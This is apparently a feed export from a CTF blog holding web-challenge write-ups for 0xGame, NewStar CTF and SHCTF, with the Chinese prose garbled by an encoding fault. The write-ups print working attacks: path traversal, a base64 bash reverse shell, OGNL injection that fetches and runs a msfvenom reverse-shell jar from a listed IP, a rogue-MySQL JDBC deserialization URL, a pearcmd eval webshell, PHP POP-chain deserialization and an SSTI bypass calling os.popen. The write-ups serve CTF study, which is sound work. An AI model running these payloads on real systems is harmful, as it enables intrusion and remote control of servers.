class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.IndexServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.demo.AuthFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ–°çš„è·¯ç”±ï¼Œç›´æ¥è®¿é—®å¾—åˆ°ä¿¡æ¯æœ‰é™ï¼Œæ ¹æ®å¾—åˆ°çš„é…ç½®æ–‡ä»¶å°è¯•æºä»£ç çš„classæ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/WEB-INF/</span>web.xm1  <span class="comment">#WEBåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº†servletå’Œå…¶å®ƒåº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>classes/  <span class="comment">#å«ç«™ç‚¹æ‰€æœ‰çš„classæ–‡ä»¶</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>lib/   <span class="comment">#å­˜æ”¾WEBåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>src/  <span class="comment">#æºç ç›®å½•</span></span><br><span class="line">WEB-INF/database.properties   <span class="comment">#æ•°æ®åº“é…èƒƒæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>classes<span class="regexp">/com/</span>example<span class="regexp">/demo/</span>EvilServlet.class</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºä»£ç ä¹‹åè¿›è¡Œåç¼–è¯‘å¾—åˆ°è·¯ç”±å’Œæ‰§è¡Œå‚æ•°</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You_Fi<span class="symbol">nd_This_Evil_Servlet_a76</span>f<span class="number">02</span>cb<span class="number">8422</span>?Evil_Cmd_Argume<span class="symbol">nts_fe37627</span>fed<span class="number">78</span>=ls</span><br></pre></td></tr></table></figure><p>åå¼¹shellè¿›è¡Œrceï¼Œå‘½ä»¤å’Œå¹³å¸¸çš„ä¸å¤ªä¸€æ ·</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">bash -c </span><span class="template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231025221533100.png" alt="image-20231025221533100"></p><h2 id="Week-4-YourBatis">[Week 4] YourBatis</h2><p>åŠ¨æ€SQLä¼šé€ æˆOGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œæµ‹è¯•paylaodå¦‚ä¸‹ï¼Œä¼ å…¥çš„æ—¶å€™ä¸€å®šå¾—urlç¼–ç </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>().<span class="built_in">exec</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨msfå¾—åˆ°shellï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆæœ¨é©¬æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp <span class="attribute">LHOST</span>=150.158.24.228 <span class="attribute">LPORT</span>=250 -f jar &gt; shell.jar</span><br></pre></td></tr></table></figure><p>å°†æœ¨é©¬ä¸‹è½½åˆ°é¶æœºä¸Š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;wget http://url/shell.jar -O 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>åœ¨vpsä¸Šå¼€å¯msfç›‘å¬</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD java/shell_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 150.158.24.228</span><br><span class="line"><span class="built_in">set</span> LPORT 250</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>åœ¨é¶æœºä¸Šæ‰§è¡Œç›®æ ‡æœ¨é©¬ï¼Œè®°å¾—urlç¼–ç </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;java -jar 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>envå¾—åˆ°flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231026152548555.png" alt="image-20231026152548555"></p><h2 id="Week-4-TestConnection">[Week 4] TestConnection</h2><p>çœ‹äº†hintçŸ¥é“äº†æ˜¯jdbcçš„æ•°æ®åº“è¿æ¥æ¼æ´</p><p>åˆ©ç”¨é¡¹ç›®ï¼š<a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>vpså¯åŠ¨æœåŠ¡ï¼Œç›´æ¥è¯»å–ç¯å¢ƒå˜é‡å°±okï¼Œé¶æœºå‘½ä»¤å¦‚ä¸‹</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testConnection?<span class="attr">username</span><span class="operator">=</span><span class="variable">&amp;password</span>=<span class="variable">&amp;driver</span>=com.mysql.jdbc.Driver<span class="variable">&amp;url</span>=jdbc:mysql:<span class="comment">//110.41.17.183:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231026155354422.png" alt="image-20231026155354422"></p>]]></content>
    
    
    <summary type="html">0xGame gogogo</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/CTF/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF WEEK 3</title>
    <link href="https://bowuchuling.github.io/posts/fcr7dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/fcr7dhw7.html</id>
    <published>2023-10-17T02:57:26.640Z</published>
    <updated>2023-10-17T03:01:02.405Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK3</h1><h2 id="Include-ğŸ">Include ğŸ</h2><p>pearcmdæ–‡ä»¶åŒ…å«ï¼Œç”¨bpå‘åŒ…é˜²æ­¢payloadè¢«ç¼–ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd&amp;<span class="regexp">/&lt;?=eval($_POST[1]);?&gt;+/</span>tmp/chuling2.php</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">?<span class="attribute">file</span>=/tmp/chuling2</span><br><span class="line">POST:</span><br><span class="line"><span class="attribute">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>åé¢å°±æ˜¯å‘½ä»¤æ‰§è¡Œäº†</p><h2 id="medium-sql">medium_sql</h2><p>sqlmapä¸€æŠŠæ¢­ï¼Œæ—¶é—´ç›²æ³¨</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url/?<span class="built_in">id</span>= -p <span class="built_in">id</span> -D ctf -T here_is_flag -C flag <span class="comment">--dump --batch</span></span><br></pre></td></tr></table></figure><h2 id="POP-Gadget">POP Gadget</h2><p>ç®€å•çš„popé“¾</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE_<span class="number">_</span>);</span><br><span class="line"></span><br><span class="line">class Begin&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this-</span><span class="built_in">&gt;name</span>))&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Then&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)();  //<span class="variable">$this-</span>&gt;func=new ç±»å();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$func</span>, <span class="variable">$vars</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;call&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;<span class="keyword">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Super&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line">    public <span class="keyword">function</span> __invoke()  //  å­—æ¯æ•°å­—()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;getStr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CTF&#123;</span><br><span class="line">    public <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;end&quot;</span>;</span><br><span class="line">        unset(<span class="variable">$this-</span>&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line">    public <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __unset(<span class="variable">$var</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)(<span class="variable">$this-</span>&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Begin();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span> = new Then();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func = new Super();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj = new Handle();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj = new CTF();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle = new WhiteGod();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;var=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">//O<span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Begin</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22name</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Then</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Super</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22Handle</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22CTF</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22handle</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22WhiteGod</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22system</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22var</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22ls</span>+<span class="meta">%2F</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><h2 id="GenShin">GenShin</h2><p>è¿‡æ»¤äº†åŒ{ï¼Œä½¿ç”¨{å’Œ%ç»•è¿‡ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ç”¨äº†ä¹‹å‰æŸæ¬¡sstiçš„expç›´æ¥getshelläº†</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(<span class="name">config</span>|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_cla&quot;</span><span class="string">&quot;ss_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_in&quot;</span><span class="string">&quot;it_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_glo&quot;</span><span class="string">&quot;bals_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_get&quot;</span><span class="string">&quot;item_&quot;</span><span class="string">&quot;_&quot;</span>)(<span class="string">&quot;o&quot;</span><span class="string">&quot;s&quot;</span>)|attr(<span class="string">&quot;po&quot;</span><span class="string">&quot;pen&quot;</span>)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&quot;re&quot;</span><span class="string">&quot;ad&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure><h2 id="R-C-E">R!!!C!!!E!!!</h2><p>åº”è¯¥å¯ä»¥ç›²æ³¨ï¼Œè¿™é‡Œä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere|script result1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="OtenkiGirl">OtenkiGirl</h2><p>çŒœä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œå­¦ing</p>]]></content>
    
    
    <summary type="html">æ–°æ‰‹èµ›ï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SHCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54fkfh75.html"/>
    <id>https://bowuchuling.github.io/posts/54fkfh75.html</id>
    <published>2023-10-15T09:13:18.233Z</published>
    <updated>2023-10-17T02:25:11.611Z</updated>
    
    <content type="html"><![CDATA[<h1>SHCTF WEEK2</h1><h2 id="WEEK2-serialize">[WEEK2]serialize</h2><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 